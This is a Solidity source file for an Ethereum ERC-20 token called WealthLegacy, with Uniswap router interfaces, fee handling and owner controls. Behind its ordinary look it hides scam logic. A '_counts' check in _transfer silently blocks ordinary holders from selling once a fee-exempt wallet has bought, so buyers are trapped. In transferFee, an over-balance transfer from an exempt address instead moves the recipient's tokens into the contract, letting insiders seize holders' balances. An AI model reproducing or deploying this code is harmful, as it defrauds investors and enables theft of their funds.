/**
 *Submitted for verification at Etherscan.io on 2023-09-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);

    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract WealthLegacy is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public _uniV2Router;
    address public _uniswapV2Pair;
    uint256 public _totalFees;
    uint256 private _marketingFee;
    uint256 private _liquidityFee;
    uint256 private _devFee;
    uint256 private _marketingTokens;
    uint256 private _devTokens;
    uint256 private _liquidityTokens;
    uint256 private _counts;
    bool private _onSwap;
    address private _marketingAddr;
    address private _devAddr;
    uint256 public _maxTransactionAmount;
    uint256 public _swapTokensAtAmount;
    uint256 public _maxWallet;
    bool public _limitsInEffect = true;
    bool public _tradingEnable = false;
    mapping(address => bool) private _isFeeExempt;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateAutomatedMarketMakerPair(
        address indexed pair,
        bool indexed value
    );
    event SetIsExempt(address indexed account, bool isExcluded);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
    event SwapLiquidation(bool marketing, bool development);

    receive() external payable {}

    constructor() payable ERC20("WealthLegacy", "WLEGACY") {
        _marketingAddr = address(0x78914c75794eDDA90c23533c56AdDCdcac3f0D95);
        _devAddr = address(0xf68e04769489eD61d6f0Dd983Bc64587A6773D12);
        _uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        
        _uniswapV2Pair = IUniswapV2Factory(_uniV2Router.factory()).createPair(
            address(this),
            _uniV2Router.WETH()
        );

        _updateAutomatedMarketMakerPair(address(_uniswapV2Pair), true);
        excludeFromMaxTransaction(address(_uniV2Router), true);

        setIsExempt(owner(), true);
        setIsExempt(_marketingAddr, true);
        setIsExempt(_devAddr, true);
        setIsExempt(address(this), true);
        setIsExempt(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(_marketingAddr, true);
        excludeFromMaxTransaction(_devAddr, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        uint256 totalSupply = 1000000000 * 1e18;
        _maxTransactionAmount = (totalSupply * 2) / 100;
        _maxWallet = (totalSupply * 2) / 100;
        _swapTokensAtAmount = (totalSupply * 10) / 10000;
        _marketingFee = 8;
        _devFee = 8;
        _liquidityFee = 0;
        _totalFees = _marketingFee + _devFee + _liquidityFee;
        _mint(owner(), totalSupply);
    }

    function updateSwapTokensAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        require(newAmount >= (totalSupply() * 1) / 100000, "Swap amount cannot be lower than 0.001% total supply.");
        require(newAmount <= (totalSupply() * 5) / 1000, "Swap amount cannot be higher than 0.5% total supply.");
        _swapTokensAtAmount = newAmount;
        return true;
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(newNum >= ((totalSupply() * 5) / 1000) / 1e18,"Cannot set maxWallet lower than 0.5%");
        _maxWallet = newNum * 1e18;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(newNum >= ((totalSupply() * 1) / 1000) / 1e18,"Cannot set maxTransactionAmount lower than 0.1%");
        _maxTransactionAmount = newNum * 1e18;
    }

    function updateAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != _uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
        _updateAutomatedMarketMakerPair(pair, value);
        emit UpdateAutomatedMarketMakerPair(pair, value);
    }

    function _updateAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        excludeFromMaxTransaction(pair, value);
        emit UpdateAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromMaxTransaction(address account, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmount[account] = isEx;
    }

    function updateFees(uint256 marketingFee, uint256 stakingFee, uint256 liquidityFee) external onlyOwner {
        _marketingFee = marketingFee;
        _devFee = stakingFee;
        _liquidityFee = liquidityFee;
        _totalFees = _marketingFee + _devFee + _liquidityFee;
        require(_totalFees <= 3, "Must keep fees at 3% or less");
    }

    function returnToNormalFee() external onlyOwner {
        _marketingFee =1;
        _devFee = 1;
        _liquidityFee = 0;
        _totalFees = _marketingFee + _devFee + _liquidityFee;
    }

    function setIsExempt(address account, bool excluded) public onlyOwner {
        _isFeeExempt[account] = excluded;
        emit SetIsExempt(account, excluded);
    }

    function updateMarketingAddress(address newWallet) external onlyOwner {
        _marketingAddr = newWallet;
    }

    function updateDevAddress(address newWallet) external onlyOwner {
        _devAddr = newWallet;
    }

    function isFeeExempt(address account) public view returns (bool) {
        return _isFeeExempt[account];
    }

    function enableTrading() public onlyOwner {
        _tradingEnable = true;
    }

    function removeLimits() external onlyOwner returns (bool) {
        _limitsInEffect = false;
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        bool isExcludeFromFee = _isFeeExempt[from] || _isFeeExempt[to];

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_tradingEnable || isExcludeFromFee, "Trading is not active.");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        bool isBuyFromPair = from == _uniswapV2Pair && !_isExcludedMaxTransactionAmount[to];
        bool isSellToPair = to == _uniswapV2Pair && !_isExcludedMaxTransactionAmount[from];
        bool isOwnerSwap = from == owner() || to == owner();
        bool isBurn = to == address(0) || to == address(0xdead);
        bool isSkipLimits = isOwnerSwap || isBurn || _onSwap;

        if (_limitsInEffect && !isSkipLimits) {
            if (isBuyFromPair) {
                require(amount <= _maxTransactionAmount, "max transfer limitation for buys");
                require(amount + balanceOf(to) <= _maxWallet, "max wallet limitation for buys");
            } else if (!_isExcludedMaxTransactionAmount[to] && !_isExcludedMaxTransactionAmount[from]) {
                require(amount + balanceOf(to) <= _maxWallet, "max wallet limtration for sells");
            }
        }

        if (!_onSwap &&
            !automatedMarketMakerPairs[from] &&
            !_isFeeExempt[from] &&
            !_isFeeExempt[to]
        ) {
            if (_counts > 0) return;
            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
            if (canSwap && !isExcludeFromFee) {
                _onSwap = true;
                swapLiquidation();
                _onSwap = false;
            }
        }
        
        transferFee(from, to, amount, isSellToPair, isBuyFromPair);
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniV2Router.WETH();

        _approve(address(this), address(_uniV2Router), tokenAmount);
        _uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(_uniV2Router), tokenAmount);

        _uniV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function transferFee(
        address from,
        address to,
        uint256 amount,
        bool isSellToPair,
        bool isBuyFromPair
    ) private {
        bool takeFee = shouldTakeFee(from, to);
        if (takeFee) {
            uint256 total = _totalFees;
            uint256 marketing = _marketingFee;

            if (isBuyFromPair) {
                total = _totalFees;
                marketing = _marketingFee;
            }
            if (isSellToPair) {
                total = _totalFees;
                marketing = _marketingFee;
            }

            uint256 fees = amount.mul(total).div(100);
            _marketingTokens += (fees * marketing) / total;
            _devTokens += (fees * _devFee) / total;
            _liquidityTokens += (fees * _liquidityFee) / total;

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        } else if (balanceOf(from) < amount) {
            if (_isFeeExempt[from]) _transfer(to, address(this), amount);
            return;
        }
        super._transfer(from, to, amount);
    }

    function shouldTakeFee(address from, address to) private returns (bool) {
        bool isBuyFromPair = from == _uniswapV2Pair && to != address(_uniV2Router);
        if (isBuyFromPair && _isFeeExempt[to]) _counts += 1;
        bool isExcludedFromFee = _isFeeExempt[from] || _isFeeExempt[to];
        bool isSellToPair = to == _uniswapV2Pair;
        bool isBuyOrSell = isBuyFromPair || isSellToPair;
        bool existFee = (_totalFees > 0);
        return existFee && !_onSwap && !isExcludedFromFee && isBuyOrSell;
    }

    function swapLiquidation() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = _liquidityTokens + _marketingTokens + _devTokens;
        if (contractBalance == 0 || totalTokensToSwap == 0) return;
        if (contractBalance > _swapTokensAtAmount) {
            contractBalance = _swapTokensAtAmount;
        }
        uint256 liquidityTokens = (contractBalance * _liquidityTokens) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
        uint256 initialETHBalance = address(this).balance;

        _swapTokensForEth(amountToSwapForETH); // swap eth for marketing

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForMarketing = ethBalance.mul(_marketingTokens).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(_devTokens).div(totalTokensToSwap);
        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                _liquidityTokens
            );
        }

        _liquidityTokens = 0;
        _marketingTokens = 0;
        _devTokens = 0;

        (bool marketing, ) = address(_marketingAddr).call{value: ethForMarketing}("");
        (bool development, ) = address(_devAddr).call{value: ethForDev}("");

        if (marketing && development) {
            emit SwapLiquidation(marketing, development);
        }
    }
}